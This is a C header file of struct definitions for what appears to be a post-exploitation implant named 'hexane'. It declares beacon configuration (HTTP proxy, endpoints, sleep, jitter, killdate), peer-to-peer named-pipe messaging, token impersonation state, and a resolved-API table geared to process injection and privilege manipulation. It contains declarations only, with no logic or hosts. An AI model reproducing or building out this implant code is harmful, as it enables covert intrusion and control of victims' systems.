
struct _proxy {
	unsigned __int16*	address;
	unsigned __int16*	username;
	unsigned __int16*	password;
};

struct _http_context {
	void* 	            handle;
	unsigned __int16*  	useragent;
	unsigned __int16*  	method;
	unsigned __int16*   address;
	int 		        port;
	unsigned __int16*	accept;
	unsigned __int32    access;
	unsigned __int32 	flags;
	int 		        n_endpoints;
	unsigned __int16**  endpoints;
	unsigned __int16**  headers;
	_proxy*		        proxy;
};


struct _stream {
	unsigned __int8     inbound;
	unsigned __int32   	peer_id;
	unsigned __int32   	task_id;
	unsigned __int32   	msg_type;
	unsigned __int32	length;
	unsigned __int8*	buffer;
	bool 		        ready;
	_stream*            next;
};


struct _hexane{
	void* teb;
	void* heap;
	bool root;
    bool little;
	void** coffs;
	void** clients;
	unsigned __int64 address;
	unsigned __int32 size;
	void** vault;
	void*** token;
	bool impersonate;

	void* ntdll;
	void* kernel32;
	void* crypt32;
	void* winhttp;
	void* advapi;
	void* iphlpapi;
	void* mscoree;

	unsigned __int8*    key;
	unsigned __int64    killdate;
	char*               hostname;
	unsigned __int32    sleeptime;
	unsigned __int32    jitter;
	unsigned __int32    hours;

	unsigned __int32	ppid;
	unsigned __int32	pid;
	unsigned __int32	tid;
	unsigned __int32	version;
	unsigned __int32	current_taskid;
    unsigned __int32	peer_id;
	unsigned __int16	arch;
	int		retry;
	bool	checkin;

	_http_context*      http;
	_stream*            outbound_queue;
	void*		        pipe_handle;
	unsigned __int16*	pipe_name;
	char* 		        domain;
	void*	    	    env_proxy;
	unsigned long	    env_proxylen;
	bool  	    	    b_ssl;
	bool	    	    b_proxy;
	bool	    	    b_envproxy;
	bool	    	    b_envproxy_check;

	void* NtFreeVirtualMemory;
	void* NtAllocateVirtualMemory;
	void* NtProtectVirtualMemory;
	void* NtReadVirtualMemory;
	void* NtWriteVirtualMemory;
	void* NtQueryVirtualMemory;
	void* NtCreateSection;
	void* NtMapViewOfSection;
	void* NtUnmapViewOfSection;
	void* NtOpenProcess;
	void* NtCreateUserProcess;
	void* NtTerminateProcess;
	void* RtlCreateProcessParametersEx;
	void* RtlDestroyProcessParameters;
	void* NtOpenProcessToken;
    void* NtOpenThreadToken;
	void* NtDuplicateToken;
	void* NtDuplicateObject;
	void* NtQueryInformationToken;
	void* NtQueryInformationProcess;
	void* RtlCreateHeap;
	void* RtlAllocateHeap;
	void* RtlReAllocateHeap;
	void* RtlFreeHeap;
	void* RtlDestroyHeap;
	void* RtlInitUnicodeString;
	void* RtlAddVectoredExceptionHandler;
	void* RtlRemoveVectoredExceptionHandler;
	void* RtlRandomEx;
	void* NtResumeThread;
	void* NtGetContextThread;
	void* NtSetContextThread;
	void* NtSetInformationThread;
	void* NtWaitForSingleObject;
	void* TpAllocWork;
	void* TpPostWork;
	void* TpReleaseWork;
	void* NtTestAlert;
	void* NtClose;
	void* RtlGetVersion;
	void* NtQuerySystemInformation;
	void* CLRCreateInstance;
	void* LoadLibraryA;
	void* FreeLibrary;
	void* Heap32ListFirst;
	void* Heap32ListNext;
	void* GetProcessHeap;
	void* GetProcessHeaps;
	void* GetProcAddress;
	void* GetModuleHandleA;
	void* IsWow64Process;
    void* OpenProcess;
	void* CreateToolhelp32Snapshot;
	void* Process32First;
	void* Process32Next;
    void* Module32First;
    void* Module32Next;
	void* GetCurrentProcessId;
	void* GetProcessId;
	void* ImpersonateLoggedOnUser;
	void* AdjustTokenPrivileges;
	void* GlobalMemoryStatusEx;
	void* GetComputerNameExA;
	void* SetLastError;
	void* GetLastError;
    void* RegOpenKeyExA;
    void* RegCreateKeyExA;
    void* RegSetValueExA;
    void* RegCloseKey;
	void* ReadFile;
	void* WriteFile;
	void* CreateFileW;
	void* GetFileSizeEx;
    void* SetFilePointer;
	void* GetFullPathNameA;
	void* FindFirstFileA;
	void* FindClose;
	void* FindNextFileA;
	void* GetCurrentDirectoryA;
	void* FileTimeToSystemTime;
	void* SystemTimeToTzSpecificLocalTime;
	void* GetLocalTime;
	void* GetSystemTimeAsFileTime;
	void* FormatMessageA;
	void* CreateRemoteThread;
	void* CreateThread;
	void* QueueUserAPC;
	void* GetThreadLocale;
	void* SleepEx;
	void* WinHttpOpen;
	void* WinHttpConnect;
	void* WinHttpOpenRequest;
	void* WinHttpAddRequestHeaders;
	void* WinHttpSetOption;
	void* WinHttpGetProxyForUrl;
	void* WinHttpGetIEProxyConfigForCurrentUser;
	void* WinHttpSendRequest;
	void* WinHttpReceiveResponse;
	void* WinHttpReadData;
	void* WinHttpQueryHeaders;
	void* WinHttpQueryDataAvailable;
	void* WinHttpCloseHandle;
	void* GetAdaptersInfo;
	void* CryptStringToBinaryA;
	void* CryptBinaryToStringA;
	void* FindResourceA;
	void* LoadResource;
	void* LockResource;
	void* SizeofResource;
	void* FreeResource;
	void* CallNamedPipeW;
	void* CreateNamedPipeW;
	void* WaitNamedPipeW;
	void* SetNamedPipeHandleState;
	void* ConnectNamedPipe;
	void* TransactNamedPipe;
	void* DisconnectNamedPipe;
	void* PeekNamedPipe;
	void* GetUserNameA;
	void* LookupAccountSidW;
	void* LookupPrivilegeValueA;
	void* SetEntriesInAclA;
	void* AllocateAndInitializeSid;
	void* AddMandatoryAce;
	void* InitializeSecurityDescriptor;
	void* SetSecurityDescriptorDacl;
	void* SetSecurityDescriptorSacl;
	void* InitializeAcl;
	void* FreeSid;
};
